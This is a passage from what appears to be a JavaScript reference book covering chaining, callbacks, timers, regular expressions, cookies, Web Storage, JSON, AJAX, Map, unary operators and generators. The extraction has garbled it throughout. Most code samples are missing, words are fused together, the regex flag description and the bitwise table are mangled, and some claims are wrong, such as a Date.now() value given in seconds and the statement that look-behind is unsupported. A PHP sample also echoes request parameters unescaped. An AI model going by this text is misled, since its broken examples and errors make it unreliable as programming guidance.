return thisObjects that can be chained are said to be chainable. If you call an object chainable, you should ensure that all returned objects / primitives are of the correct type. It only takes one time for your chainable object to not return the correct reference (easy to forget to add ) and the person using your API will lose trust and avoid chaining. Chainable objects should be all or nothing (not a chainable object even if parts are). An object should not be called chainable if only some of its functions are.


Don't create ambiguity in the return type
clonetoStringNot all function calls return a useful chainable type, nor do they always return a reference to self. This is where common sense use of naming is important. In the above example the function call .() is unambiguous. Other examples are .() implies a string is returned.
An example of an ambiguous function name in a chainable object.

Syntax convention
There is no formal usage syntax when chaining. The convention is to either chain the calls on a single line if short or to chain on the new line indented one tab from the referenced object with the dot on the new line. Use of the semicolon is optional but does help by clearly denoting the end of the chain.

A bad syntax
   vec          // new line before the first function call
      .scale()  // can make it unclear what the intention is
      .log();
   vec.          // the dot on the end of the line       scale(2).  // is very difficult to see in a mass of code       scale(1/2); // and will likely frustrate as can easily be missed                   // when trying to locate bugs
Left hand side of assignment
When you assign the results of a chain the last returning call or object reference is assigned.
 var vec2 = vec.scale(2)                 .add(x:1,y:10)
                .clone();   // the last returned result is assigned
                                // vec2 is a clone of vec after the scale and add
In the above example vec2 is assigned the value returned from the last call in the chain. In this case, that would be a copy of vec after the scale and add.
Summary
The advantage of changing is clearer more maintainable code. Some people prefer it and will make chainable a requirement when selecting an API. There is also a performance benefit as it allows you to avoid having to create variables to hold interim results. With the last word being that chainable objects can be used in a conventional way as well so you don't enforce chaining by making an object chainable.
Section 28.2: Method Chaining
Method chaining is a programming strategy that simplifies your code and beautifies it. Method chaining is done by ensuring that each method on an object returns the entire object, instead of returning a single element of that object. For example:

Door.prototypeNote that each method in  returns this, which refers to the entire instance of that Door object.
Chapter 29: Callbacks
Section 29.1: Simple Callback Usage Examples
Callbacks offer a way to extend the functionality of a function (or method) without changing its code. This approach is often used in modules (libraries / plugins), the code of which is not supposed to be changed.
Suppose we have written the following function, calculating the sum of a given array of values:

alertNow suppose that we want to do something with each value of the array, e.g. display it using (). We could make the appropriate changes in the code of foo, like this:

console.log instead of alertBut what if we decide to use ()? Obviously changing the code of foo, whenever we
decide to do something else with each value, is not a good idea. It is much better to have the option to change our mind without changing the code of foo. That's exactly the use case for callbacks. We only have to slightly change foo's signature and body:

And now we are able to change the behaviour of foo just by changing its parameters:

Examples with Asynchronous Functions
$.getJSONIn jQuery, the () method to fetch JSON data is asynchronous. Therefore, passing code in a callback makes sure that the code is called after the JSON is fetched.
$.getJSON() syntax:

$.getJSONExample of () code:

$.getJSONThe following would not work, because the data-handling code would likely be called before the data is actually received, because the  function takes an unspecified length of time and does not hold up the call stack as it waits for the JSON.

animateAnother example of an asynchronous function is jQuery's () function. Because it takes a specified time to run the animation, sometimes it is desirable to run some code directly following the animation.
animate.() syntax:

For example, to create a fading-out animation after which the element completely disappears, the following code can be run. Note the use of the callback.

This allows the element to be hidden right after the function has finished execution. This differs from:

animatebecause the latter does not wait for () (an asynchronous function) to complete, and therefore the element is hidden right away, producing an undesirable effect.
Section 29.2: Continuation (synchronous and asynchronous)
Callbacks can be used to provide code to be executed after a method has completed:


doSomething() method above executes synchronously with the callback - execution blocks until doSomethingThe () returns, ensuring that the callback is executed before the interpreter moves on.
Callbacks can also be used to execute code asynchronously:

doSomethingThe then callbacks are considered continuations of the () methods. Providing a callback as the last instruction in a function is called a tail-call, which is optimized by ES2015 interpreters.
Section 29.3: What is a callback?
This is a normal function call:

When you call a normal function, it does its job and then returns control back to the caller.
However, sometimes a function needs to return control back to the caller in order to do its job:

In the above example, the function double is a callback for the function map because:
1. The function double is given to the function map by the caller.
2. The function map needs to call the function double zero or more times in order to do its job.
Thus, the function map is essentially returning control back to the caller every time it calls the function double. Hence, the name "callback".
Functions may accept more than one callback:


Here then function then accepts two callback functions, onFulfilled and onRejected. Furthermore, only one of these two callback functions is actually called.
What's more interesting is that the function then returns before either of the callbacks are called. Hence, a callback function may be called even after the original function has returned.
Section 29.4: Callbacks and `this`
Often when using a callback you want access to a specific context.

Solutions  Use bind
bind effectively generates a new function that sets this to whatever was passed to bind then calls the original function.

Arrow functions automatically bind the current this context.

Often you'd like to call a member function, ideally passing any arguments that were passed to the event on to the function.
Solutions:


Section 29.5: Callback using Arrow function
Using arrow function as callback function can reduce lines of code.
The default syntax for arrow function is

This can be used as callbacks
For example if we want to print all elements in an array [1,2,3,4,5] without arrow function, the code will look like this

With arrow function, it can be reduced to

function(x){console.log(x)} is reduced to x=>console.logHere the callback function (x)
Section 29.6: Error handling and control-flow branching
Callbacks are often used to provide error handling. This is a form of control flow branching, where some instructions are executed only when an error occurs:

compareCode execution in () above has two possible branches: success when the expected and actual values are the same, and error when they are different. This is especially useful when control flow should branch after some asynchronous instruction:

compareIt should be noted, multiple callbacks do not have to be mutually exclusive - both methods could be called. Similarly, the () could be written with callbacks that are optional (by using a noop as the default value - see Null Object pattern).
Chapter 30: Intervals and Timeouts
Section 30.1: Recursive setTimeout
To repeat a function indefinitely, setTimeout can be called recursively:

Unlike setInterval, this ensures that the function will execute even if the function's running time is longer than the specified delay. However, it does not guarantee a regular interval between function executions. This behaviour also varies because an exception before the recursive call to setTimeout will prevent it from repeating again, while setInterval would repeat indefinitely regardless of exceptions.
Section 30.2: Intervals

Section 30.3: Intervals
Standard
You don't need to create the variable, but it's a good practice as you can use that variable with clearInterval to stop the currently running interval.
var int = setInterval("doSomething()", 5000 ); /* 5 seconds */
var int = setInterval(doSomething, 5000 ); /* same thing, no quotes, no parens */
If you need to pass parameters to the doSomething function, you can pass them as additional parameters beyond the first two to setInterval.
Without overlapping
setInterval, as above, will run every 5 seconds (or whatever you set it to) no matter what. Even if the function doSomething takes long than 5 seconds to run. That can create issues. If you just want to make sure there is that pause in between runnings of doSomething, you can do this:

Section 30.4: Removing intervals
window.setInterval() returns an IntervalID, which can be used to stop that interval from continuing to run. To
window.setInterval() in a variable and call clearIntervaldo this, store the return value of () with that variable as the only argument:

This will be logged every 5 secondsThis will log  every 5 seconds, but will stop it after 32 seconds. So it will log the message 6 times.
Section 30.5: Removing timeouts
window.setTimout() returns a TimeoutID, which can be used to stop that timeout from running. To do this, store
window.setTimeout() in a variable and call clearTimeoutthe return value of () with that variable as the only argument:

This will not log the message because the timer is stopped after 3 seconds.
Section 30.6: setTimeout, order of operations, clearTimeout
setTimeout
Executes a function, after waiting a specified number of milliseconds.
used to delay the execution of a function.
setTimeout(function, milliseconds) or window.setTimeout(function, millisecondsSyntax : )
Example : This example outputs "hello" to the console after 1 second. The second parameter is in milliseconds, so 1000 = 1 sec, 250 = 0.25 sec, etc.

Problems with setTimeout if you're using the setTimeout method in a for loop :

 threeThis will output the value 3 times, which is not correct.
Workaround of this problem :

It will output the value 0,1,2. Here, we're passing the i into the function as a parameter(j).
Order of operations
Additionally though, due to the fact that JavaScript is single threaded and uses a global event loop, setTimeout can be used to add an item to the end of the execution queue by calling setTimeout with zero delay. For example:

Will actually output:

setTimeoutAlso, zero milliseconds here does not mean the function inside the setTimeout will execute immediately. It will take slightly more than that depending upon the items to be executed remaining in the execution queue. This one is just pushed to the end of the queue. Cancelling a timeout clearTimeout() : stops the execution of the function specified in () Syntax : clearTimeout(timeoutVariable) or window.clearTimeout(timeoutVariable)
Example :

Chapter 31: Regular expressions
Flags	Details g	global. All matches (don't return on the first match). m	multi-line. Causes ^ & $ to match the begin/end of each line (not only begin/end of string). i	insensitive. Case insensitive match (ignores case of [a-zA-Z]).
u	unicode : Pattern strings are treated as UTF-16. Also causes escape sequences to match Unicode characters. sticky: matches only from the index indicated by the lastIndex property of this regular expression in the
y target string (and does not attempt to match from any later indexes).
Section 31.1: Creating a RegExp Object
Standard Creation
It is recommended to use this form only when creating regex from dynamic variables.
Use when the expression may change or the expression is user generated.

With flags:

With a backslash: (this must be escaped because the regex is specified with a string)

Static initialization
Use when you know the regular expression will not change, and you know what the expression is before runtime.

With flags:

With a backslash: (this should not be escaped because the regex is specified in a literal)

Section 31.2: RegExp Flags
test/ginew RegExp('test', 'gi'There are several flags you can specify to alter the RegEx behaviour. Flags may be appended to the end of a regex literal, such as specifying gi in /, or they may be specified as the second argument to the RegExp constructor, as in ).
zAg - Global. Finds all matches instead of stopping after the first. i - Ignore case. /[a-z]/i is equivalent to /[a--Z]/.
m - Multiline. ^ and $ match the beginning and end of each line respectively treating \n and \r as delimiters instead of simply the beginning and end of the entire string.
Version ≥ 6
u - Unicode. If this flag is not supported you must match specific Unicode characters with \uXXXX where XXXX is the character's value in hexadecimal. y - Finds all consecutive/adjacent matches.
Section 31.3: Check if string contains pattern using .test()

The test method performs a search to see if a regular expression matches a string. The regular expression [a-z]+ will search for one or more lowercase letters. Since the pattern matches the string, "match exists" will be logged to the console.
Section 31.4: Matching With .exec()
execMatch Using .()
RegExp.prototype.exec(string) returns an array of captures, or null if there was no match.

match.index is 3, the (zero-based) location of the match.
match[0] is the full match string.
match[1] is the text corresponding to the first captured group. match[n] would be the value of the nth captured group.

found 'a', next exec starts at index '2' found 'a', next exec starts at index '5' found 'a', next exec starts at index '8'
Section 31.5: Using RegExp With Strings
The String object has the following methods that accept regular expressions as arguments.



		Array ["str", "gstr", "g"]
Search with RegExp
search.() returns the index at which a match is found or -1.

Expected output
3
-1
Section 31.6: RegExp Groups
JavaScript supports several types of group in its Regular Expressions, capture groups, non-capture groups and lookaheads. Currently, there is no look-behind support.
Capture
patternSometimes the desired match relies on its context. This means a simple RegExp will over-find the piece of the String that is of interest, so the solution is to write a capture group (). The captured data can then be referenced as...
str.matchstr.match discards captures, use re.execString replacement "$n" where n is the n th capture group (starting from 1) The n th argument in a callback function
If the RegExp is not flagged g, the n+1 th item in a returned  Array
If the RegExp is flagged g,  instead
Say there is a String where all + signs need to be replaced with a space, but only if they follow a letter character. This means a simple match would include that letter character and it would also be removed. Capturing it is the solution as it means the matched letter can be preserved.

Non-Capture
?:patternUsing the form (), these work in a similar way to capture groups, except they do not store the contents of the group after the match.
They can be particularly useful if other data is being captured which you don't want to move the indices of, but need to do some advanced pattern matching such as an OR

Look-Ahead
?=patternIf the desired match relies on something which follows it, rather than matching that and capturing it, it is possible to use a look-ahead to test for it but not include it in the match. A positive look-ahead has the form (), a negative look-ahead (where the expression match only happens if the look-ahead pattern did not match) has the
?!patternform ()

Section 31.7: Replacing string match with a callback function
String#replace can have a function as its second argument so you can provide a replacement based on some
logic.


One line template library

Section 31.8: Using Regex.exec() with parentheses regex to extract matches of a string
Sometimes you doesn't want to simply replace or remove the string. Sometimes you want to extract and process matches. Here an example of how you manipulate matches.
What is a match ? When a compatible substring is found for the entire regex in the string, the exec command produce a match. A match is an array compose by firstly the whole substring that matched and all the parenthesis in the match.
Imagine a html string :

You want to extract and get all the links inside an a tag. At first, here the regex you write :

But now, imagine you want the href and the anchor of each link. And you want it together. You can simply add a new regex in for each match OR you can use parentheses :


At the end of the loop, you have an array of link with anchor and href and you can use it to write markdown for example :

To go further :
 Nested parenthesis

Chapter 32: Cookies
Section 32.1: Test if cookies are enabled
navigator.cookieEnabledIf you want to make sure cookies are enabled before using them, you can use :

navigator.cookieEnabledNote that on older browsers  may not exist and be undefined. In those cases you won't detect that cookies are not enabled.
Section 32.2: Adding and Setting Cookies
The following variables set up the below example:
var COOKIE_NAME = "Example Cookie";    /* The cookie's name. */ var COOKIE_VALUE = "Hello, world!";    /* The cookie's value. */ var COOKIE_PATH = "/foo/bar";          /* The cookie's path. */ var COOKIE_EXPIRES;                    /* The cookie's expiration date (config'd below). */
/* Set the cookie expiration to 1 minute in future (60000ms = 1 minute). */ COOKIE_EXPIRES = (new Date(Date.now() + 60000)).toUTCString();
document.cookie +=   COOKIE_NAME + "=" + COOKIE_VALUE
  + "; expires=" + COOKIE_EXPIRES
  + "; path=" + COOKIE_PATH;
Section 32.3: Reading cookies

This will set cookie_value to the value of the cookie, if it exists. If the cookie is not set, it will set cookie_value to
null
Section 32.4: Removing cookies

This will remove the cookie with a given name.
Chapter 33: Web Storage
Parameter	Description name	The key/name of the item value	The value of the item
Section 33.1: Using localStorage
The localStorage object provides persistent (but not permanent - see limits below) key-value storage of strings. Any changes are immediately visible in all other windows/frames from the same origin. The stored values persistent indefinitely unless the user clears saved data or configures an expiration limit. localStorage uses a map-like interface for getting and setting values.

If you want to store simple structured data, you can use JSON to serialize it to and from strings for storage.
var players = [{name: "Tyler", score: 22}, {name: "Ryan", score: 41}]; localStorage.setItem('players', JSON.stringify(players));
console.log(JSON.parse(localStorage.getItem('players')));
 // [ Object { name: "Tyler", score: 22 }, Object { name: "Ryan", score: 41 } ] localStorage limits in browsers
Mobile browsers:
	Browser	Google Chrome Android Browser Firefox iOS Safari
Version404.3346-8Space available10MB2MB10MB5MBDesktop browsers:
	Browser	Google Chrome Opera Firefox Safari Internet Explorer
	Version	40	27	34	6-8	9-11
Space available	10MB	10MB	10MB	5MB	10MB
Section 33.2: Simpler way of handling Storage
localStorage, sessionStorage are JavaScript Objects and you can treat them as such.
getItem(), .setItemInstead of using Storage Methods like .(), etc... here's a simpler alternative:


Example:

Section 33.3: Storage events
Whenever a value in set in localStorage, a storage event will be dispatched on all other windows from the same origin. This can be used to synchronize state between different pages without reloading or communicating with a server. For example, we can reflect the value of an input element as paragraph text in another window: First Window

Second Window

Notes
Event is not fired or catchable under Chrome, Edge and Safari if domain was modified through script.
First window

Second Window

Section 33.4: sessionStorage
The sessionStorage object implements the same Storage interface as localStorage. However, instead of being shared with all pages from the same origin, sessionStorage data is stored separately for every window/tab. Stored data persists between pages in that window/tab for as long as it's open, but is visible nowhere else.

Save data to sessionStorage

Get saved data from sessionStorage

Remove saved data from sessionStorage

Section 33.5: localStorage length
localStorage.length property returns an integer number indicating the number of elements in the localStorage
Example:
Set Items

Get length

Section 33.6: Error conditions
Most browsers, when configured to block cookies, will also block localStorage. Attempts to use it will result in an exception. Do not forget to manage these cases.

If error were not handled, program would stop functioning properly.
Section 33.7: Clearing storage
To clear the storage, simply run

Section 33.8: Remove Storage Item
To remove a specific item from the browser Storage (the opposite of setItem) use removeItem

Example:

(Same applies for sessionStorage)
Chapter 34: Data attributes
Section 34.1: Accessing data attributes
Using the dataset property
data-*The new dataset property allows access (for both reading and writing) to all data attributes  on any element.

Note: The dataset property is only supported in modern browsers and it's slightly slower than the getAttribute and setAttribute methods which are supported by all browsers.
Using the getAttribute & setAttribute methods
If you want to support the older browsers before HTML5, you can use the getAttribute and setAttribute methods which are used to access any attribute including the data attributes. The two functions in the example above can be written this way:

input(stringParameterDetailsJSON.parseParse a JSON stringChapter 35: JSON
reviver(function	)	JSON string to be parsed.
value(stringJSON.stringifySerialize a serializable value	)	Prescribes a transformation for the input JSON string.
replacer(functionNumber[])String	)	Value to be serialized according to the JSON specification.
space(String or [] or

Selectively includes certain properties of the value object.
If a number is provided, then space number of whitespaces will be
 or Number)	inserted of readability. If a string is provided, the string (first 10 characters) will be used as whitespaces.

JSON (JavaScript Object Notation) is a lightweight data-interchange format. It is easy for humans to read and write and easy for machines to parse and generate. It is important to realize that, in JavaScript, JSON is a string and not an object.
A basic overview can be found on the json.org website which also contains links to implementations of the standard in many different programming languages.
Section 35.1: JSON versus JavaScript literals
evalJSON stands for "JavaScript Object Notation", but it's not JavaScript. Think of it as just a data serialization format that happens to be directly usable as a JavaScript literal. However, it is not advisable to directly run (i.e. through ()) JSON that is fetched from an external source. Functionally, JSON isn't very different from XML or YAML - some confusion can be avoided if JSON is just imagined as some serialization format that looks very much like JavaScript.
Even though the name implies just objects, and even though the majority of use cases through some kind of API always happen to be objects and arrays, JSON is not for just objects or arrays. The following primitive types are supported:
String (e.g. "Hello World!")
Number (e.g. 42)
Boolean (e.g. true)
The value null
undefined is not supported in the sense that an undefined property will be omitted from JSON upon serialization. Therefore, there is no way to deserialize JSON and end up with a property whose value is undefined.
The string "42" is valid JSON. JSON doesn't always have to have an outer envelope of "{...}" or "[...]".
While some JSON is also valid JavaScript and some JavaScript is also valid JSON, there are some subtle differences between both languages and neither language is a subset of the other.
Take the following JSON string as an example:

This can be directly inserted into JavaScript. It will be syntactically valid and will yield the correct value:

However, we know that "color" is a valid identifier name and the quotes around the property name can be omitted:

We also know that we can use single quotes instead of double quotes:

But, if we were to take both of these literals and treat them as JSON, neither will be syntactically valid JSON:

JSON strictly requires all property names to be double quoted and string values to be double quoted as well.
It's common for JSON-newcomers to attempt to use code excerpts with JavaScript literals as JSON, and scratch their heads about the syntax errors they are getting from the JSON parser.
More confusion starts arising when incorrect terminology is applied in code or in conversation.
A common anti-pattern is to name variables that hold non-JSON values as "json":

response.dataIn the above example,  is a JSON string that is returned by some API. JSON stops at the HTTP response domain. The variable with the "json" misnomer holds just a JavaScript value (could be an object, an array, or even a simple number!)
A less confusing way to write the above is:

Developers also tend to throw the phrase "JSON object" around a lot. This also leads to confusion. Because as mentioned above, a JSON string doesn't have to hold an object as a value. "JSON string" is a better term. Just like "XML string" or "YAML string". You get a string, you parse it, and you end up with a value.
Section 35.2: Parsing with a reviver function
A reviver function can be used to filter or transform the value being parsed.
Version ≥ 5.1

Version ≥ 6

This produces the following result:

This is particularly useful when data must be sent that needs to be serialized/encoded when being transmitted with JSON, but one wants to access it deserialized/decoded. In the following example, a date was encoded to its ISO 8601 representation. We use the reviver function to parse this in a JavaScript Date.
Version ≥ 5.1

Version ≥ 6

It is important to make sure the reviver function returns a useful value at the end of each iteration. If the reviver function returns undefined, no value or the execution falls off towards the end of the function, the property is deleted from the object. Otherwise, the property is redefined to be the return value.
Section 35.3: Serializing a value
JSON.stringifyA JavaScript value can be converted to a JSON string using the  function.

1. value The value to convert to a JSON string.
/* Boolean */  JSON.stringify(true)             // 'true'
/* Number  */  JSON.stringify(12)               // '12'
/* String  */  JSON.stringify('foo')            // '"foo"'
/* Object  */  JSON.stringify({})               // '{}'
               JSON.stringify({foo: 'baz'})     // '{"foo": "baz"}'
/* Array   */  JSON.stringify([1, true, 'foo']) // '[1, true, "foo"]'
/* Date    */  JSON.stringify(new Date())       // '"2016-08-06T17:25:23.588Z"'
/* Symbol  */  JSON.stringify({x:Symbol()})     // '{}'
2. replacer A function that alters the behaviour of the stringification process or an array of String and Number objects that serve as a whitelist for filtering the properties of the value object to be included in the JSON string. If this value is null or is not provided, all properties of the object are included in the resulting JSON string.

3. space For readability, the number of spaces used for indentation may be specified as the third parameter.

\tAlternatively, a string value can be provided to use for indentation. For example, passing '' will cause the tab character to be used for indentation.

Section 35.4: Serializing and restoring class instances
You can use a custom toJSON method and reviver function to transmit instances of your own class in JSON. If an object has a toJSON method, its result will be serialized instead of the object itself.
Version < 6



This produces the a string with the following content:
{"name":"John","car":{"$type":"com.example.Car","color":"red","speed":"fast"}}
var userObject = JSON.parse(userJson, function reviver(key, value) {   return (value && value.$type === 'com.example.Car') ? Car.fromJSON(value) : value; });
This produces the following object:

Section 35.5: Serializing with a replacer function
A replacer function can be used to filter or transform values being serialized.


This produces the following string:

Section 35.6: Parsing a simple JSON string
JSON.parseThe () method parses a string as JSON and returns a JavaScript primitive, array or object:
const array = JSON.parse('[1, 2, "c", "d", {"e": false}]'); console.log(array); // logs: [1, 2, "c", "d", {e: false}]
Section 35.7: Cyclic object values
Not all objects can be converted to a JSON string. When an object has cyclic self-references, the conversion will fail. This is typically the case for hierarchical data structures where parent and child both reference each other:

As soon as the process detects a cycle, the exception is raised. If there were no cycle detection, the string would be infinitely long.
Chapter 36: AJAX
AJAX stands for "Asynchronous JavaScript and XML". Although the name includes XML, JSON is more often used due to its simpler formatting and lower redundancy. AJAX allows the user to communicate with external resources without reloading the webpage.
Section 36.1: Sending and Receiving JSON Data via POST
Version ≥ 6
jsonFetch request promises initially return Response objects. These will provide response header information, but they don't directly include the response body, which may not have even loaded yet. Methods on the Response object such as .() can be used to wait for the response body to load, then parse it.

Section 36.2: Add an AJAX preloader
Here's a way to show a GIF preloader while an AJAX call is executing. We need to prepare our add and remove preloader functions:

Now we're going to look at where to use these functions.

request.readyState == Inside the onreadystatechange function you should have an if statement with condition: 4
&& request.status == 200.
removePreloaderIf true: the request is finished and response is ready that's where we'll use ().
addPreloaderElse if false: the request is still in progress, in this case we'll run the function ()

Section 36.3: Displaying the top JavaScript questions of the month from Stack Overflow's API
We can make an AJAX request to Stack Exchange's API to retrieve a list of the top JavaScript questions for the month, then present them as a list of links. If the request fails or the returns an API error, our promise error handling displays the error instead.
Version ≥ 6
View live results on HyperWeb.


Section 36.4: Using GET with parameters
This function runs an AJAX call using GET allowing us to send parameters (object) to a file (string) and launch a callback (function) when the request has been ended.

Here's how we use it:
ajax('cars.php', {type:"Volvo", model:"300", color:"purple"}, function(response) {
  // add here the code to be executed when data comes back to this page        // for example console.log(response) will show the AJAX response in console });
cars.phpAnd the following shows how to retrieve the url parameters in :
if(isset($_REQUEST['type'], $_REQUEST['model'], $_REQUEST['color'])) {   // they are set, we can use them !
  $response = 'The color of your car is ' . $_REQUEST['color'] . '. ';
  $response .= 'It is a ' . $_REQUEST['type'] . ' model ' . $_REQUEST['model'] . '!';   echo $response; }
console.log(responseIf you had ) in callback function the result in console would have been:
		The color of your car is purple. It is a Volvo model 300!
Section 36.5: Check if a file exists via a HEAD request
This function executes an AJAX request using the HEAD method allowing us to check whether a file exists in the directory given as an argument. It also enables us to launch a callback for each case (success, failure).

Section 36.6: Using GET and no parameters

The fetch API is a newer promise-based way to make asynchronous HTTP requests.

Section 36.7: Listening to AJAX events at a global level

Chapter 37: Enumerations
Section 37.1: Enum definition using Object.freeze()
Version ≥ 5.1
JavaScript does not directly support enumerators but the functionality of an enum can be mimicked.

The above enumeration definition, can also be written as follows:

After that you can define a variable and print like before.
Section 37.2: Alternate definition
Object.freeze()The  method is available since version 5.1. For older versions, you can use the following code (note that it also works in versions 5.1 and later):

Section 37.3: Printing an enum variable
After defining an enum using any of the above ways and setting a variable, you can print both the variable's value as well as the corresponding name from the enum for the value. Here's an example:


Section 37.4: Implementing Enums Using Symbols
As ES6 introduced Symbols, which are both unique and immutable primitive values that may be used as the key of an Object property, instead of using strings as possible values for an enum, it's possible to use symbols.

The Symbols in ECMAScript 6 article covers this new primitive type more in detail.
Section 37.5: Automatic Enumeration Value
Version ≥ 5.1
This Example demonstrates how to automatically assign a value to each entry in an enum list. This will prevent two enums from having the same value by mistake. NOTE: Object.freeze browser support



Chapter 38: Map
Parameter	Details
key, valueiterable Any iterable object (for example an array) containing [] pairs. key	The key of an element. value	The value assigned to the key. callback Callback function called with three parameters: value, key, and the map. thisArg	Value which will be used as this when executing callback.
Section 38.1: Creating a Map
A Map is a basic mapping of keys to values. Maps are different from objects in that their keys can be anything (primitive values as well as objects), not just strings and symbols. Iteration over Maps is also always done in the order the items were inserted into the Map, whereas the order is undefined when iterating over keys in an object. To create a Map, use the Map constructor:

It has an optional parameter, which can be any iterable object (for example an array) which contains arrays of two elements - first is the key, the seconds is the value. For example:
const map = new Map([[new Date(), {foo: "bar"}], [document.body, "body"]]);
//                      ^key          ^value          ^key        ^value
Section 38.2: Clearing a Map
clearTo remove all elements from a Map, use the .() method:

Example:

Section 38.3: Removing an element from a Map
deleteTo remove an element from a map use the .() method.

Example:

This method returns true if the element existed and has been removed, otherwise false:

Section 38.4: Checking if a key exists in a Map
hasTo check if a key exists in a Map, use the .() method:

Example:

Section 38.5: Iterating Maps
keys(), .values() and .entries(). .entriesMap has three methods which returns iterators: .() is the default
key, valueMap iterator, and contains [] pairs.

forEachMap also has .() method. The first parameter is a callback function, which will be called for each element in the map, and the second parameter is the value which will be used as this when executing the callback function.
The callback function has three arguments: value, key, and the map object.

Section 38.6: Getting and setting elements
get(key) to get value by key and .set(key, valueUse .) to assign a value to a key.
getIf the element with the specified key doesn't exist in the map, .() returns undefined.
.set() method returns the map object, so you can chain .set() calls.

Section 38.7: Getting the number of elements of a Map
.sizeTo get the numbers of elements of a Map, use the  property:


Chapter 39: Timestamps
Section 39.1: High-resolution timestamps
performance.now() returns a precise timestamp: The number of milliseconds, including microseconds, since the
current web page started to load.
performanceTiming.navigationStartMore generally, it returns the time elapsed since the  event.

performance.now()For example, in a web browser's main context,  returns 6288.319 if the web page began to load 6288 milliseconds and 319 microseconds ago.
Section 39.2: Get Timestamp in Seconds
To get the timestamp in seconds

Section 39.3: Low-resolution timestamps
Date.now() returns the number of whole milliseconds that have elapsed since 1 January 1970 00:00:00 UTC.

Date.now()For example,  returns 1461069314 if it was called on 19 April 2016 at 12:35:14 GMT.
Section 39.4: Support for legacy browsers
Date.now() is unavailable, use (new Date()).getTime()In older browsers where  instead:

Date.now()Or, to provide a  function for use in older browsers, use this polyfill:

Chapter 40: Unary Operators
Section 40.1: Overview
Unary operators are operators with only one operand. Unary operators are more efficient than standard JavaScript function calls. Additionally, unary operators can not be overridden and therefore their functionality is guaranteed.
The following unary operators are available:
OperatorOperationExampledeleteThe delete operator deletes a property from an object.examplevoidThe void operator discards an expression's return value.exampletypeofThe typeof operator determines the type of a given object.example+The unary plus operator converts its operand to Number type.example-	The unary negation operator converts its operand to Number, then negates it. example
~	Bitwise NOT operator.	example
!	Logical NOT operator.	example
Section 40.2: The typeof operator
The typeof operator returns the data type of the unevaluated operand as a string.
Syntax:

Returns:
These are the possible return values from typeof:
	Type	Return value
Undefined	"undefined"
Null	"object"
Boolean	"boolean"
Number	"number"
String	"string"
Symbol (ES6)	"symbol"
Function object	"function"
document.all"undefined"
Host object (provided by the JS environment) Implementation-dependent
Any other object	"object"
document.allThe unusual behavior of  with the typeof operator is from its former usage to detect legacy browsers.
For more information, see Why is document.all defined but typeof document.all returns "undefined"?
Examples:


Section 40.3: The delete operator
The delete operator deletes a property from an object.
Syntax:

Returns:
If deletion is successful, or the property did not exist:
 true
If the property to be deleted is an own non-configurable property (can't be deleted):
false in non-strict mode.
Throws an error in strict mode
Description
The delete operator does not directly free memory. It can indirectly free memory if the operation means all references to the property are gone.
delete works on an object's properties. If a property with the same name exists on the object's prototype chain, the property will be inherited from the prototype. delete does not work on variables or function names.
Examples:

Section 40.4: The unary plus operator (+)
The unary plus (+) precedes its operand and evaluates to its operand. It attempts to convert the operand to a number, if it isn't already.
Syntax:
+expression Returns:  a Number. Description
The unary plus (+) operator is the fastest (and preferred) method of converting something into a number.
It can convert:
string representations of integers (decimal or hexadecimal) and floats.
booleans: true, false.
null
Values that can't be converted will evaluate to NaN.
Examples:


Note that attempting to convert an array can result in unexpected return values. In the background, arrays are first converted to their string representations:

The operator then attempts to convert those strings to numbers:

Section 40.5: The void operator
The void operator evaluates the given expression and then returns undefined.
Syntax:

Returns:
     undefined Description
void 0 or voidThe void operator is often used to obtain the undefined primitive value, by means of writing (0). Note that void is an operator, not a function, so () is not required.
Usually the result of a void expression and undefined can be used interchangeably.
window.undefinedHowever, in older versions of ECMAScript,  could be assigned any value, and it is still possible to use undefined as name for function parameters variables inside functions, thus disrupting other code that relies on the value of undefined. void will always yield the true undefined value though.
void window.undefined0 is also commonly used in code minification as a shorter way of writing undefined. In addition, it's probably safer as some other code could've tampered with .
Examples:

Changing the value of undefined inside a certain scope:

Section 40.6: The unary negation operator (-)
The unary negation (-) precedes its operand and negates it, after trying to convert it to number.
Syntax:
-expression Returns:  a Number.
Description
The unary negation (-) can convert the same types / values as the unary plus (+) operator can.
NaNValues that can't be converted will evaluate to NaN (there is no -).
Examples:

Note that attempting to convert an array can result in unexpected return values. In the background, arrays are first converted to their string representations:

The operator then attempts to convert those strings to numbers:

Section 40.7: The bitwise NOT operator (~)
The bitwise NOT (~) performs a NOT operation on each bit in a value.
Syntax:
~expression Returns:
 a Number.
Description
The truth table for the NOT operation is:
a NOT a

Examples: value (base 10) value (base 2) return (base 2) return (base 10)
20000001011111100-310000000111111110-200000000011111111-1-111111111000000000-211111110000000011-311111100000000102Section 40.8: The logical NOT operator (!)
The logical NOT (!) operator performs logical negation on an expression.
Syntax:
!expression Returns:  a Boolean.
Description
The logical NOT (!) operator performs logical negation on an expression.
true === false and !false === trueBoolean values simply get inverted: !.
Non-boolean values get converted to boolean values first, then are negated.
This means that a double logical NOT (!!) can be used to cast any value to a boolean:

trueThese are all equal to !:


Examples:


Chapter 41: Generators
functionGenerator functions (defined by the * keyword) run as coroutines, generating a series of values as they're requested through an iterator.
Section 41.1: Generator Functions
functionA generator function is created with a * declaration. When it is called, its body is not immediately executed. Instead, it returns a generator object, which can be used to "step through" the function's execution.
A yield expression inside the function body defines a point at which execution can suspend and resume.

Early iteration exit
generator = nums(); generator.next(); // Executes lines A,B returning { value: 1, done: false } generator.next(); // Executes lines C,D returning { value: 2, done: false } generator.return(3); // no code is executed returns { value: 3, done: true }
// any further calls will return done = true
generator.next(); // no code executed returns { value: undefined, done: true }
Throwing an error to generator function

Section 41.2: Sending Values to Generator
next()It is possible to send a value to the generator by passing it to the  method.

Section 41.3: Delegating to other Generator
yield*From within a generator function, the control can be delegated to another generator function using .

Section 41.4: Iteration
for...ofA generator is iterable. It can be looped over with a  statement, and used in other constructs which depend on the iteration protocol.

function Here is another example of use generator to custom iterable object in ES6. Here anonymous generator function * used.

Section 41.5: Async flow with generators
Generators are functions which are able to pause and then resume execution. This allows to emulate async functions using external libraries, mainly q or co. Basically it allows to write functions that wait for async results in order to go on:

This allows to write async code as if it were synchronous. Moreover, try and catch work over several async blocks. If the promise is rejected, the error is caught by the next catch:


Section 41.6: Iterator-Observer interface
A generator is a combination of two things - an Iterator and an Observer.
Iterator
An iterator is something when invoked returns an iterable. An iterable is something you can iterate upon. From ES6/ES2015 onwards, all collections (Array, Map, Set, WeakMap, WeakSet) conform to the Iterable contract.
		A generator(iterator) is a producer. In iteration the consumer PULLs the value from the producer.
Example:

a.nexta.nextWhenever you call (), you're essentially pull-ing value from the Iterator and pause the execution at yield. The next time you call (), the execution resumes from the previously paused state.
Observer
